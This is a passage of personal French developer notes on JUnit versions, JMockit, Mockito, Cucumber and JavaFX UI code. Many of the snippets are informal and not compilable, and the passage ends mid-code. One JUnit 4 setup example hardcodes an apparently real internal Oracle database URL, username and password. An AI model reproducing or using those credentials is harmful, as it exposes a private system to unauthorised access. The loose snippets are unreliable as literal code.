            <version>1.3.0</version>
            <scope>test</scope>
        </dependency>
          import org.junit.jupiter.api.AfterEach;
          
          import org.junit.jupiter.api.Assertions;
          ou
          import static org.junit.jupiter.api.Assertions.*;
          
          import org.junit.jupiter.api.Nested;
          import org.junit.jupiter.api.Test;
        public class TestUtilsTest { // les classes de test doivent toujours se terminer par Test ou Tests
          @BeforeAll(...) //remplace @BeforeClass.
          public static void xxxx()....
             @BeforeEach // remplace @Before
             public void reset() throws IOException
            @Test
                  public void siJaiCetEtat_AlorsJeMattendsACa...
            @AfterAll(...) //remplace @AfterClass
          @Nested // c'est un HierarchicalContextRunner :-) LINKjunithierar // pour faire des des Tests dans des innerclass PUBLIQUES de ma classe de test: le before de la classe de test s'execute, puis le before de l'innerclass dans la classe de test  les tests de l'innerclass puis l'after de l'innerclass puis l'after de la classe de test;: bien mettre que des methodes publiques
          protected class NestedTest{ // les classes de test doivent toujours se terminer par Test ou Tests
                @BeforeEach (....) //remplace @Before
                @Test
                @Disabled // remplace @Ignore
                public void siJaiCetEtat_AlorsJeMattendsACa.....Assertions.assertEquals(3,res.size());
                assertAll("user", // regroupement d'assertions 
                      () -> assertEquals("Johnson", user.getName()),
                      () -> assertEquals("johnson@gmail.com", user.getEmail()));
                assertIterableEquals(users, userDAO.findAll()); ou assertArrayEquals(users, userDAO.findAll()); // nouveau : les fils doivent avoir la methode equals declaree
                 Exception exception = assertThrows(NullPointerException.class, () -> user.getName()); //tester qu'il renvoit bien une exception
                @AfterEach (....)  //remplace @After                          
    Pour faire un testsuite en junit5 :LINKtestesuitelksjgmhklj 
                package renault.diversitysimulator;
                  import org.junit.platform.suite.api.SelectClasses;
                  import org.junit.platform.suite.api.SelectPackages;
                  import renault.diversitysimulator.application.ApplicationTest;
                  @SelectPackages({
                              "renault.diversitysimulator.storage",
                              "renault.diversitysimulator.business"
                      })
                      @ExcludePackages({
                      "renault.diversitysimulator.application.independentfortest",
                      "renault.diversitysimulator.application.canvas",
                      "renault.diversitysimulator.storage.savejsondata"
                      })
                      @SelectClasses({
                              ParameterDefaultValueMapperDataModelTest.class
                      })
                      @ExcludeClassNamePatterns({"^.*ATests?$"})
                      @ExcludeTags({ // du coup j'ai mis dans les classes de tests : public class ApplicationTest {
                                                                                                                   @Test
                              "visualize"                                                                          @Tag("visualize") // permet dans testSuite de filtrer ce qu'on veut tester
                      })                                                                                           public void methodeDeTestAIgnorer() throws Exception
                      @RunWith(JUnitPlatform.class)
                  public class TestSuite{
                  }

     
Version 1.4:
                    package renault.tests;
                   
                    import static org.junit.Assert.assertTrue;
                    import org.junit.After;
                    import org.junit.AfterClass;
                    import org.junit.Before;
                    import org.junit.BeforeClass;
                    import org.junit.Test;
                    import de.bechte.junit.runners.context.HierarchicalContextRunner;existe en junit5 voir LINKjunithierar
                    
                    @RunWith(.... ou HierarchicalContextRunner) 
                    public class UtilityTest 
                    {
                    
                    Tester qu'il y a une exception particulière (a mettre dans la methode de test en amont de l'execution)
                              @Rule
                              public ExpectedException expectedEx = ExpectedException.none(); // a mettre dans la classe de test. peut servir a toutes ses methodes.
                              expectedEx.expect(SAMLException.class);   // a mettre dans la methode de test avant execution du test
                              expectedEx.expectMessage("SAML Signature is invalid");
  
  
                      	private Object de1;
                    	@BeforeClass public static void setup()
                      {
                                      connectionF = new ConnectionFactory();
                                   		try
                                   		{
                                   		connectionF.setUrl("jdbc:oracle:thin:@wecdevo01.intra.renault.fr:1521:ml1p15");
                                   		connectionF.setUser("wec_adm");
                                   		connectionF.setPassword("wec1234");
                                   		connectionF.initConnection();
                                  		assertTrue(connectionF.getConnection()!=null);
                                   		} catch (ClassNotFoundException e) {
                                  			// TODO Auto-generated catch block
                                  			e.printStackTrace();
                                  		} catch (SQLException e) {
                                  			// TODO Auto-generated catch block
                                  			e.printStackTrace();
                                  		}
                    	}
                    	@Before public void setUp(){ de1 = new Object();} // s'execute avant chaque test de la classe (comme @After si je veux faire before et after uniquement sur une methode de test jouer avec try et finally)
                    	  //testunitaires: ATTENTION sur JUNIT4 , si le nom de notre methode commence par "test" il va executer systematiquement cette methode
                    	/*@Test(expected=NoDatabaseException.class)
                    	 *		public void siJaiCetEtat_AlorsJeMattendsACa() throws NoDatabaseException
                    			{
                    				
                    				//ne pas utiliser asserttrue
                            assertEquals("0,001.00",Utility.replaceDotByCommaForNumbers("0,001.00"));
                    			} 
                    	 */
                    	 @Test(expected = IllegalBalanceException.class) // verifier qu'un test retourne une exception
                          public void siJaiCetEtat_AlorsJeMattendsACa() throws IllegalBalanceException {
                              AccountRule accountRule= new CustomerAccountRule();
                              customerAccount.withdrawAndReportBalance(50.0,accountRule);
                          }
                    	@Test(timeout=10)
                      @Ignore // pour ne pas passer ce test
                      public void oneTest()
                    	{
                    	             				//ne pas utiliser asserttrue
                    		assertEquals("valeur Matrice",Objet.get());
                    	}
                    	@After public void tearDown(){}
                    	@AfterClass public static void closeDatabase()
                      {
                    	             if (connectionF.getConnection()!=null)
                              		{
                              			try {
                              				connectionF.getConnection().close();
                              			} catch (SQLException e) {
                              				// TODO Auto-generated catch block
                              				e.printStackTrace();
                              			}
                              		}	
                    	}
                    }
            // definition du testSuite:
                  	              	import org.junit.runner.RunWith;
                                    import org.junit.runners.Suite;
                                    @RunWith(Suite.class)  // c'est une classe apart
                                        @Suite.SuiteClasses({
                                                SAMLAuthenticationRequestFilterTest.class,
                                                SignRequestTest.class,
                                                SsoSamlPropertiesSingletonTest.class
                                        })
                                    public class TestSuite {}

Version 1.3:
      
      Test contenant plusieurs test unitaires
      public class TestBlah extends TestCase 
      {
      	public TestBlah(String name) 
      	{
      		super(name);
      	}
      	
      	public static void main(String[] args) {
      		/** Text mode pour afficher les retour dans la console sous forme texte*/
      		//junit.textui.TestRunner.run(suite());
      		
      		/** A Swing based mode pour afficher les retour sur une belle interface en utilisant eclipse*/
      		junit.swingui.TestRunner.run(TestBlah.class);
      	}
      	
      	public static TestSuite suite() { // SUR JUNIT 3 va definir la liste de tests unitaires à lancer.
      		//TestSuite newSuite = new TestSuite(TestBlah.class); // pour tester toutes les methodes de la classe de test.
      		TestSuite newSuite = new TestSuite();
              newSuite.addTest(new TestBlah("testPremier")); // le nom de la methode de la classe de test à tester est "testPremier"
              newSuite.addTest(new TestBlah("testSecond"));//idemn
              newSuite.addTest(new TestBlah("testSMTPMessage"));		//idemn
              return newSuite;
      	}
      	
      	protected void setUp() throws Exception {
      		super.setUp();
      		
      		//ici je defini des variables utilisees par toutes les methodes du test. Cette methode setUp est executee avant CHAQUE methode du test
      		File inputFile = new File (TestPoi.INPUT_FILE);
      	}
      
      	protected void tearDown() throws Exception {
      		super.tearDown();
      		// ne rien faire ici mais definir cette methode: sert à vider la memoire...
      	}
      //testunitaires:
      	public void testPremier() 
      	{
      		try 
      		{
      			SpreadsheetManager sm = new SpreadsheetManager ();
      			assertNotNull(sm);
      			...
      		}
      		catch (Throwable e) {      linkgetStringStackTrace
      			StringWriter sw = new StringWriter();
      			        PrintWriter pw = new PrintWriter(sw, true);
      			        e.printStackTrace(pw);
      			        pw.flush(); //Flushes this output stream and forces any buffered output bytes to be written out.
      			        sw.flush();
      			        System.out.println( sw.toString());
      					fail ("Exception thrown " + sw.toString());
      		}
      	}
      	public void testSecond() 
      	{
      			try 
      			{
      			SpreadsheetManager sm = new SpreadsheetManager ();
      			assertNotNull(sm);
      			...
      			}
      			catch (Throwable e) {
      			fail ("Exception thrown " + e.getMessage());
      		}
         }
Mockito : mockery : mock : tests :
JMockit(le top car permet de tester l'intestable)>Mockito>EasyMock>Jmock AFAIRE comprendre jmockit et à documenter voir D:\RD\hello-world-war-master\src\test\tests\JMockitTest.java
    JMOCKIT : JMOKIT : (plus reussi à le faire marcher avec Junit5. Mais Mockito si)
                             <dependency>
                			<groupId>org.jmockit</groupId>
                			<artifactId>jmockit</artifactId>
                			<version>1.38</version>
                			<scope>test</scope>
                		</dependency>

                          package tests;
                          import static org.junit.Assert.fail;
                          import mockit.Expectations;
                          import mockit.Injectable;
                          import mockit.Mocked;
                          import mockit.Tested;
                          import mockit.Verifications;
                          import mockit.integration.junit4.JMockit;
                          import org.junit.Test;
                          import org.junit.runner.RunWith;
                          @RunWith(JMockit.class) // est facultatif (en tout cas a virer avec junit5)
                          public class JMockitTest {
                              @Tested private UneClasseATesterPasUneInterface; // Obligatoire pour que je reste fonctionne. c la classe qui est testee et dedans j'ai plein de dependances soit injectees soit instanciees et je dois les mocker
                              Inecter et mocked le moins possible : mieux vaut réecrire les classes dans la classe de test. sinon jmockit bug avec l'ordre des expectations.
                              @Injectable private JMockitTest.Collaborator collaborator="valeurFacultative"; // Mieux vaut mettre ca en param de methode de test. je mock les objets dans ma classe testee : ca va remplacer les autowired dans ma classe testee par une seule instance mockee . ATTENTION le nom de la variable est important je crois
                              @Injectable private IReportManager reportManager; // seulement Un champ, celui ci, de ma classe testee va être moqué pour toute la classe. Eviter:plutot mettre dans meth.
                              @Mocked HttpServletRequest httpServletRequest; // ca ca remplace carrement tous les objets de ce type dans ma classe testee meme si c pas des autowired mais des instanciees en dur (heu sur? parce que pour une methode de test il n'a pas été injecté)
                              
                               MAIS mettre tous ces fields plutot en parametre de ma méthode de test comme ci-dessous sinon risque d'objet mocké null (pour les statics) et pour que le scope soit limité à un test
                              @Test
                              public void testThePerformMethod(@Mocked final JMockitTest.Model model, @Mocked final SsoContext request) { // si j'ai erreur "should have no parameters" c parce que j'ai oublié de mettre  @RunWith(JMockit.class)
                                  try {
                                      new Expectations() {{   // possible en faire plusieurs pour un test.(si par ex le test s'appuye sur une autre methode qui en contient)
                                         reportManager.onPeutMettreUneMethIntermediaire().createReport((String)any,(String)any,(Map<String,Object>)any); result="renvera ca la premiere fois","renverra ci la deuxieme fois",...); minTimes=0 //l'ordre est important la premiere fois seulement avec ça. // il accepte tous les parametres possibles et renverra toujours la meme chose
                                         request.getRequest(); result=httpServletRequest; // ici le result est un autre objet mocké lui aussi: renvera que ça une fois.
                                         Ne marche plus:Deencapsulation.invoke(IOUtils.class ou uneInstance , "writeFile", anyString, anyString, withAny(InputStream.class)); returns(null); times=8; //Renverra null 8 fois. simuler le comportement dune classe statique. Pour tester une methode privee private
                                         httpServletRequest.getRequestURL(); result="aaaaaaa"; si time=1; L'ORDRE EST IMPORTANT! (sinon mettre minTimes=0) c'est l'ordre d'execution du programme testé. si erreur UnexpectedInvocation modifier l'ordre
                                         httpServletRequest.getMethod(); result="POST";
                                         model.getInfo(); result = "bar";
                                          collaborator.collaborate("bar"); result = true;
                                      }};
                                      performer.perform(model);
                                      String info = model.getInfo();
                                      System.out.println(info);
                                      boolean res = collaborator.collaborate("bar");
                                      System.out.println(res);
                                      new Verifications() {{ // pas encore compris.
                                          collaborator.receive(true);
                                      }};
                                  }
                                  catch(Exception e)
                                  {
                                      e.printStackTrace();
                                  }
                              si erreur Invalid place to verify expectations
                                    C'est parce que je ne peux pas Mocked ou Injectable certains objets dans les déclaration de ma classe de test mais uniquement à faire en parametre de ma methode de test. Procéder par élimination
                              Cette erreur signifie: 
                              mockit.internal.UnexpectedInvocation: Unexpected invocation of:
                              com.hraccess.tools.service.security.AuthenticationToken#getPrincipal() // dans le code je suis tombé sur cette methode
                                 on instance: com.hraccess.tools.service.security.AuthenticationToken@5c33f1a9
                              when was expecting an invocation of:                      //alors que tu as programmé dans tes expectations dans l'ordre
                              com.hraccess.tools.form.FileUploadForm#getType()          //ceci 
                                 on mock instance: com.hraccess.tools.form.FileUploadForm@4ec4f3a0
                      
                      //A METTRE DANS la methode de test avant l'execution du test: pour mocker meme des classes statique non injectees (Marche bien!)
                          new MockUp<IOUtils>() { // je mocke dans mon programme toutes la classe IOUtils LINKmockitclass // on ne peut pas mocker d'interface: creer une classe(pas abstraite) qui implemente l'interface et toutes ces methodes vides.. Ne pas oublier de mettre ma methode testee en @Tested
                          @Mock 
                            public Map<String... excelTemplateOnUserRole(... excelTemplates) { //copier la signature et virer "abstract" et static
                              return unevariablecreeDansMonTestARetourner;
                            }
                          };
                      
                          // cette classe IOUtils ci dessous est complettement mockee dans le programme (meme si elle est statique et non injectee) Cette methode marche pas bien voir LINKmockitclass
                          public static final class IOUtils extends MockUp<com.hraccess.tools.utils.IOUtils>
                          {
                            @Mock  // je override le comportement de la methode writeFile de la classe IOUtils dans mon programme. Pour que ca marche la methode doit avoir la meme signature
                              public static void writeFile(String directory, String filename, InputStream inputStream) throws FileNotFoundException, IOException {
                              (...)
                            }
                            }
                          }
                        

    Mockito : Mokito :dans mon test:
    <!-- https://mvnrepository.com/artifact/org.mockito/mockito-all -->
      <dependency>
          <groupId>org.mockito</groupId>
          <artifactId>mockito-all</artifactId>
          <version>1.10.19</version>
          <scope>test</scope>
      </dependency>

    FilterConfig filterConfig = mock(FilterConfig.class);
    ServletContext context = mock(ServletContext.class);
    when(filterConfig.getServletContext()).thenReturn(context);
    ResultDao rd =mock(ResultDao.class);
    Result toto = new Result();
    Mockito.doReturn(toto).when(rd).getLaMethodeResult("1"); // retourner toto quand on execute resultdao.getResult("1");
    WelcomeController wc = new WelcomeController(rd);
    wc.getDisplayResult("1", "1","10:00", "10/10/2016");

cucumber : il fait ce que fait junit mais permet à des non techniciens de comprendre les tests.LINKcucumberldfj 
      Feature: action globale
        Scenario: User case label
          Given quand machin fait ça
          And il a ça dans la main
          When il fait ça
          Then il se passe ça
          And il se passe ça aussi
          
      projet
      |
      src
        |_main_java_...
        |_test_java_...
        |_resources_unrepertoire
                                |_fichier.feature // a l'execution des tests maven lit ça
                                |_
 		pom.xml:<dependency>
			<groupId>info.cukes</groupId>
			<artifactId>cucumber-junit</artifactId>
			<version>1.1.8</version>
		</dependency>
javafx : jfx :
        java11 javafx : 
    ma main classe qui est statique doit etendre extends the javafx.application.Application
            start();// entrypoint 
            |                     pour recuperer un parameter parametre argument args du main : partout: Parameters params = ParametersImpl.getParameters(this);
            V                                                                                            String mainParameter = params.getUnnamed().get(0);
            Stage___________________________
            |                    |    ...
            V                    V
            Scene(=page)        Scene(=page)
                |
             contient nodes
                 Root = (StackPane..., )
                            p redim
                          contient  
     arbre :                  V
                        TreeView contient arbre de 
                            TreeItem(dont1estroot) = TreeCell retourné par cellFactory
                            |_fils:TreeItem
            treeview: pour faire des branches avec un style special pas besoin de s'emmerder avec cellFactory sauf si c'est pour que la cellule soit tres interactive.
                            juste besoin d'aulieu d'utiliser treeitem directement je sousclasse: 
                                    public class BooleanExpressionNodeTreeItem extends TreeItem<IBooleanExpressionNode>
                                        {
                                            public BooleanExpressionNodeTreeItem(IBooleanExpressionNode node)
                                            {
                                                super(node,unNode) ; // ici en deuxieme argument je peux mettre ce que je veux comme Node!
                                                ou setGraphic(unNode);
                                                for (IBooleanExpressionNode child:node.getChildren())
                                                {
                                                    this.getChildren().add(new BooleanExpressionNodeTreeItem(child)) ;
                                                }
                                            }

    colorer un texte couleur : format de texte :
            private Text key= new Text("Key");
              key.setFill(javafx.scene.paint.Paint.valueOf("blue"));
              Text scenetitle = new Text(parameter.getClass().getSimpleName()); 
        scenetitle.setFont(Font.font("Tahoma", FontWeight.NORMAL, 20));
    mettre un placeholder au texte : 
        final TextField volumeTextField = new TextField();
        volumeTextField.setPromptText("volume");     
     faire un confirm confirmation: 
             public static Optional openConfirmationDialog(String alertDialogTitle, String alertDialogHeader, String alertDialogContexte) {
                Alert alert = new Alert(Alert.AlertType.CONFIRMATION);
                alert.setTitle(alertDialogTitle);
                alert.setHeaderText(alertDialogHeader);
                alert.setContentText(alertDialogContexte);
                return alert.showAndWait();
            }
               Utilisation : 
               Optional<ButtonType> result = Utils.openConfirmationDialog("Confirm","Confirm", "Delete " + ((ClassificationNodeDataModel) newValue).getBusinessReference().getName() + "?");
                if (result.get() == ButtonType.OK)
                {               
    
        fenetre modale message ou prompt ou alert: On peut faire une fenetre de login avec. Voir https://code.makery.ch/blog/javafx-dialogs-official/
                Alert alert = new Alert(AlertType.INFORMATION); ou WARNING ou ERROR  ou CONFIRMATION
                ou
                TextInputDialog alert = new TextInputDialog("saisissez ici");
                ou
                ChoiceDialog<String> dialog = new ChoiceDialog<>("b", choices); et choices c'est List<String> choices
                alert.initModality(Modality.NONE); ou WINDOW_MODAL ou APPLICATION_MODAL
                // DEBUT pour changer l'icone
                Stage stage = (Stage) alert.getDialogPane().getScene().getWindow();
                stage.getIcons().add(new Image(this.getClass().getResource("login.png").toString()));
                                        // pour faire une image jfx :            final ImageView imageView = new ImageView(
                                                                                    new Image("https://upload.wikimedia.org/wikipedia/commons/b/b7/Idylls_of_the_King_3.jpg")
                                                                            );
                                                                            imageView.setFitHeight(300);
                                                                            imageView.setFitWidth(228);
                // FIN pour changer l'icone
                alert.setTitle("Information Dialog");
                alert.setHeaderText("Look, an Information Dialog"); ou (null);
                alert.setContentText("I have a great message for you!");
                alert.getButtonTypes().setAll(buttonTypeOne, buttonTypeTwo, buttonTypeThree, buttonTypeCancel); // sont tous des boutons. Mais si c'est juste pour OK et Cancel voir LINKdkjgdkhlz
                ou
                alert.getDialogPane().setExpandableContent(un gridpane contenant qqchose);
                puis
                alert.showAndWait();
                ou
                Optional<String> result = alert.showAndWait(); si c'est TextInputDialog  ou ChoiceDialog
                ou
                Optional<ButtonType> result = alert.showAndWait(); LINKdkjgdkhlz pas besoin de mettre les boutons dans un CONFIRMATION Alert
                
                if (result.get() == ButtonType.OK){  ou buttonTypeOne ou Two...
                      // ... user chose OK
                  } else {
                      // ... user chose CANCEL or closed the dialog
                  }
        avant: 
                  public static void displayError(Exception e1)
              {
                  Dialog dialog = new Dialog();
                  DialogPane dialogEmbeded = new DialogPane();
                  dialogEmbeded.setContent(new ScrollPane(new TextArea(Utils.printStacktrace(e1))));
                  dialog.setDialogPane(dialogEmbeded);
                  dialog.getDialogPane().getButtonTypes().addAll(ButtonType.CLOSE);
                  dialog.setWidth(100);
                  dialog.setHeight(100);
                  dialog.show();
              }
pour fermer close une fenetre window
        Stage stage = (Stage) formView.getScene().getWindow();
            stage.close();
stackpane superpose des layers les uns par dessus les autres
        StackPane glass = new StackPane();
            StackPane.setAlignment(label, Pos.BOTTOM_CENTER);
            glass.getChildren().addAll(tree,label,line1);
pour faire de beaux panes de page avec top botom bottom left right center 
    BorderPane leftPane = new BorderPane() ;            
ouvrir une nouvelle fenetre :
                Stage primaryStage = new Stage();
                primaryStage.setTitle("Console");
                StackPane root = new StackPane() ;
                root.getChildren().addAll(UnNodeJFX) ;
                 Scene scene = new Scene(root, 400, 400) ;
                primaryStage.setScene(scene) ;
                primaryStage.show() ;
pour faire une ligne jfx trait separation separateur :
            Line line1 = new Line(0, 0, 100, 200);

    wrapper avec scoller scrollbar
            combinedStrutsForm = new ScrollPane(combinedStructureParametersPresentor.convertJavaObjectToNode(parameters));
    splitpane pour diviser l'ecran en deux :
            vSplit = new SplitPane(); 
            vSplit.getItems().addAll(treeNode, hSplit);
            vSplit.setDividerPositions(0.3f); // place par defaut le diviseur à 0.3/1.0. ON peut en mettre plusieurs à la suite
    tester junit javafx thread: pour que l'affichage de javafx ne bloque pas l'enchainement de mon test
               AtomicBoolean ok = new AtomicBoolean(true);
              Thread th= new Thread(() -> {
                              try{
                                  application.initialize();
                              }
                              catch (Exception e)
                              {
                                  ok.set(false);
                              }
                    });
              th.start();
              Thread.sleep(3000);
              Assertions.assertTrue(ok.get());
pour executer une tache en arriere fond et mettre un sablier pendant que le thread s'execute (javafx)
           Thread th= new Thread(() -> {
                  Platform.runLater(new Runnable() /// thread
                  {
                      @Override
                      public void run()
                      {
                          ApplicationContext.getInstance().showSablier(); // change la souris en sablier (stage.getScene().setCursor(Cursor.WAIT);)
                      }
                  });
                  String[] tableRules = allRules.split(";"); // le programme execute et prend du temps
                  engineService.applyRules(tableRules);      // le programme execute et prend du temps
                  Platform.runLater(new Runnable()
                  {
                      @Override
                      public void run()
                      {
                          ApplicationContext.getInstance().removeSablier();    // retire le sablier
                          ApplicationContext.getInstance().refreshAndDisplayLastController();      // rafraichit l'ecran
                      }
                  });
              });
              th.start();
              
        stylees icones :images :
                <!-- http://aalmiray.github.io/ikonli/
                  we use : http://aalmiray.github.io/ikonli/cheat-sheet-fontawesome.html
                  -->
                      <dependency>
                          <groupId>org.kordamp.ikonli</groupId>
                          <artifactId>ikonli-javafx</artifactId>
                          <version>2.3.0</version>
                      </dependency>
                  <dependency>
                      <groupId>org.kordamp.ikonli</groupId>
                      <artifactId>ikonli-fontawesome-pack</artifactId>
                      <version>2.3.0</version>
                  </dependency>
            imageUrl=FontAwesome.COG.getDescription();
            MenuItem add = new MenuItem(label,new FontIcon(imageUrl));
    arbre click listener :
            ((TreeView<IParameter>)treeNode).getSelectionModel().selectedItemProperty().addListener((observable, oldValue, newValue) -> refreshVboxView(newValue));
    toggle :boutton :ou boutton :tout court bouton :button :buton :y mettre un listener :
            ((ToggleButton)toggleButton).setOnAction(event ->{
                    if (toggleButton.isSelected()){...
                   
faire un save as saveas sauver  avec bouton boutton button parcourir fichier download charger 
          public void execute() throws Exception // mon controlleur
          {
              FileChooser fc = new FileChooser();
              fc.setTitle("Exporter vers...");
              fc.getExtensionFilters().addAll(
                      new FileChooser.ExtensionFilter("Xls Files",
                              "*.xlsx")
                  );
              File export = fc.showSaveDialog(ApplicationContext.getInstance().stage); // pour sauver exporter
              file = fileChooser.showOpenDialog(ApplicationContext.getInstance().stage); // pour importer loader
              if (export!=null)
              {
                  SaveExcelServices saveToExcelFile = new SaveExcelServices();
                  saveToExcelFile.saveAllToExcel(export);
                  Utils.displayMessage("Export OK");
              }
          }
    faire un tableau table tableview :
        List<VolumeDataModel> datamodels =new ArrayList<VolumeDataModel>();
        TableView table = new TableView();
        TableColumn yearCol = new TableColumn("Year");
        TableColumn salesVolumesCol = new TableColumn("SalesVolumes");
        table.getColumns().addAll(yearCol, salesVolumesCol);
        yearCol.setCellValueFactory(new PropertyValueFactory<VolumeDataModel,String>("year")); // year doit correspondre au nom du champ du bean VolumeDataModel
        salesVolumesCol.setCellValueFactory(new PropertyValueFactory<VolumeDataModel,String>("volume"));
        table.setItems(FXCollections.observableArrayList(datamodels));      
        voir LINKtablevieweditablestyle pour styler mon tableau
        tableView.getSelectionModel().setCellSelectionEnabled(true); // pour que les cellules selectionnées soient hightlightées avec du css voir LINKtablevieweditablestyle. ca rend le tableau plus sympa pour l'editer                        
    faire un tableau avec des colonnes dynamiques : 
        tableView = new TableView();
        List<List<String>> parametersdata// contient : -List<String> des labels-colonnes de la table
        if(parametersdata.size()>0){                   -List<String> valeurs ligne 1
            buildHeader(parametersdata);               -List<String> valeurs ligne 2.
            buildBody(parametersdata);                 -...      .
        }                                                       .
           return tableView;                                    .
    }
    private void buildHeader(List<List<String>> params)
    {
        List<String> columnNames = params.get(0);
        for (int i = 0; i < columnNames.size(); i++) {
            final int finalIdx = i;
            TableColumn<ObservableList<String>, String> column = new TableColumn<>(columnNames.get(i));
            column.setCellValueFactory(param ->new ReadOnlyObjectWrapper<>(param.getValue().get(finalIdx)));
            column.setMaxWidth(0.0); // si je veux changer la width (masquer la colonne)
            DEBUT-CETTE PARTIE LA C POUR RENDRE LE TABLEAU EDITABLE (ajouter aussi tableView.setEditable(true); avant pour que ça marche)
            column.setCellFactory(TextFieldTableCell.forTableColumn()); //utiliser ca a gauche mais inutile d'uiliser une cellfactory customisée c'est relou. ici ca marche tres bien avec "entree" et les fleches pour selectionner la cellule du tableau à éditer
            column.setOnEditCommit(event -> { // si on veut le faire pour toutes les colonnes en une fois il faut boucler sur toutes les colonnes et faire ça
                ObservableList<String> row = event.getRowValue();
                row.set(finalIdx, event.getNewValue());
                System.out.println("aaa");
                String costline = row.get(0);
                String value = row.get(finalIdx);
                tablelist.stream().filter(datarow->{
                        System.out.println(datarow.get(0).equals(costline));
                        return datarow.get(0).equals(costline);
                }).reduce((carry,elt)->carry);
            });
            FIN-CETTE PARTIE LA C POUR RENDRE LE TABLEAU EDITABLE
            
            
            
            tableView.getColumns().add(column);
        }
    }
    private void buildBody(List<List<String>> data)
    {
        for (int i = 1; i < data.size(); i++) {
            tableView.getItems().add(FXCollections.observableArrayList(data.get(i)));
        }
    }
        colorier des lignes d'un tableview row
                      tableView.setRowFactory(new Callback<TableView, TableRow>()
                      {
                          @Override
                          public TableRow call(TableView param)
                          {
                              return new TableRow<ObservableList<String>>(){
                                  @Override
                                  protected void updateItem(ObservableList<String> item, boolean empty)
                                  {
                                      if (item !=null && item.get(0).contains("Total"))
                                      {
                                          this.setStyle("-fx-background-color:gray;");
                                      }
                                      super.updateItem(item, empty);
                                  }
                              };
                          }
              
                      });
            savoir quelle ligne est selectionnée dans la tableview tableau et recuperer l'objet correspondant 
                    ParameterDataModel selectedPropertyDataModel = table.getSelectionModel().getSelectedItem(); (necessite un typage de tableview<xxx>)                              
  faire des onglets tabs : 
        private TabPane tabPane;
        private Tab genericTab;
        private Tab booleanTree;
border bordure
    pane.setBorder(new Border(new BorderStroke(Color.GREEN,BorderStrokeStyle.SOLID,CornerRadii.EMPTY,BorderWidths.FULL))); // pas encore parfait
    ou bien mettre un espace bord centrer 
                tableNPVAndDiscountRate.setPadding(new Insets(10));
faire du style css  (bons exemples: http://fxexperience.com/2011/12/styling-fx-buttons-with-css/)
            java11:utiliser scenicview pour tester la mise en forme : set JAVA_HOME=C:\Java\jdk-11.0.1 puis C:\Users\lduverge\Desktop\ALTRAN\FXSCenicView\scenic-view>gradlew.bat run (demarrer d'abord mon programme avec jdk11)
            unText.setStyle("-fx-font-size:20px;");
            final Label label = new Label("The Once\nand\nFuture King");
            label.setStyle("-fx-text-fill: goldenrod; -fx-font: italic 20 \"serif\"; -fx-padding: 0 0 20 0; -fx-text-alignment: center");
            et aussi : 
                final String path = ClassLoader.getSystemResource("diversitysimulator.css").toExternalForm(); LINKtablevieweditablestyle
                tableView.getStylesheets().add(path);
                tableView.getStyleClass().add("borderpane");
                ou dans resources/diversitysimulator.css j'ai : 
                 .region{
                          -fx-padding:50px;
                          -fx-background-color:linear-gradient(to bottom right, #00B5B5, #0081AA); /*degrade diagonale*/
                          }
                          .button
                          {
                          -fx-text-fill:white;/* couleur du texte */
                          -fx-font-weight: bold;
                          -fx-padding:50px; /* agrandi la taille de l'objet.. ici le bouton */
                          -fx-background-radius: 50; /*boutton rond*/
                          -fx-background-color:#00B5B5; equivalent a -fx-color: black;  mais ce dernier ajuste aussi automatiquement la couleur du texte.
                          -fx-border-color: blue;
                          -fx-border-insets: 5;
                          -fx-border-width: 3;
                          -fx-border-style: dashed; 
                          -fx-effect: dropshadow(three-pass-box, purple, 10, 0, 0, 0); //ombre        
                          }
pour faire un toggle button bouton buton boutton annimé animé en javafx jfx utiliser les animations : 
    public class ToggleButtonApplicationTest extends Application {
            @Override
        	    public void start(Stage primaryStage) throws Exception {
        	        primaryStage.setScene(new Scene(createContent()));
        	        primaryStage.show();
        	    }
        
        	    public static void main(String[] args) {
        	        launch(args);
        	    }
	    private Parent createContent() { // tout ca c'est main. Le bouton est là LINKkfkfkfkfklsjfllsls
	        Pane root = new Pane();
	        root.setPrefSize(300, 300);

	        Rectangle bg = new Rectangle(300, 300);

	        ToggleSwitch toggle = new ToggleSwitch();
	        toggle.setTranslateX(100);
	        toggle.setTranslateY(100);

	        Text text = new Text();
	        text.setFont(Font.font(18));
	        text.setFill(Color.WHITE);
	        text.setTranslateX(100);
	        text.setTranslateY(200);
	        text.textProperty().bind(Bindings.when(toggle.switchedOnProperty()).then("ON").otherwise("OFF"));
	        root.getChildren().addAll(toggle, text);
	        return root;
	    }

	    private static class ToggleSwitch extends Parent { LINKkfkfkfkfklsjfllsls
	        private BooleanProperty switchedOn = new SimpleBooleanProperty(false);

	        private TranslateTransition translateAnimation = new TranslateTransition(Duration.seconds(0.25)); // definition durée d'une animation de deplacement
	        private FillTransition gaucheFillAnimation = new FillTransition(Duration.seconds(0.25)); // definition durée d'une animation de couleur
	        private FillTransition droiteFillAnimation = new FillTransition(Duration.seconds(0.25));

	        private ParallelTransition animation = new ParallelTransition(translateAnimation, gaucheFillAnimation, droiteFillAnimation); // indispensable 

	        public BooleanProperty switchedOnProperty() {
	            return switchedOn;
	        }

	        public ToggleSwitch() {
	            Rectangle background = new Rectangle(200, 50);
	            background.setArcWidth(50);
	            background.setArcHeight(50);
	            background.setFill(Color.WHITE);
	            background.setStroke(Color.LIGHTGRAY);
	            final Text gaucheLabel = new Text("Gauche");
	            final Text droiteLabel = new Text("Droite");
	            gaucheLabel.setLayoutY(27);
	            droiteLabel.setLayoutY(27);
	            
	            gaucheLabel.setLayoutX(6);
	            droiteLabel.setLayoutX(120);
            
	          

	            Rectangle trigger = new Rectangle(100,50);
	            trigger.setArcWidth(50);
	            trigger.setArcHeight(50);
	            trigger.setFill(Color.web("#1780af",1.0));
	            trigger.setStroke(Color.LIGHTGRAY);

	            DropShadow shadow = new DropShadow();
	            shadow.setRadius(2);
	            trigger.setEffect(shadow);

	            translateAnimation.setNode(trigger); // j'attache mon animation de type deplacement a un objet
	            gaucheFillAnimation.setShape(gaucheLabel); // j'attache mon animation de type couleur a un objet
	            droiteFillAnimation.setShape(droiteLabel);  // j'attache mon animation de type couleur a un objet

	            getChildren().addAll(background, trigger,gaucheLabel,droiteLabel);
	            

	            switchedOn.addListener((obs, oldState, newState) -> {
	                boolean isOn = newState.booleanValue();
	                translateAnimation.setToX(isOn ? 100 : 0);
	                gaucheFillAnimation.setFromValue(isOn ? Color.WHITE : Color.web("#1780af",1.0));
	                gaucheFillAnimation.setToValue(isOn ? Color.web("#1780af",1.0): Color.WHITE);
	                droiteFillAnimation.setFromValue(!isOn ? Color.WHITE : Color.web("#1780af",1.0));
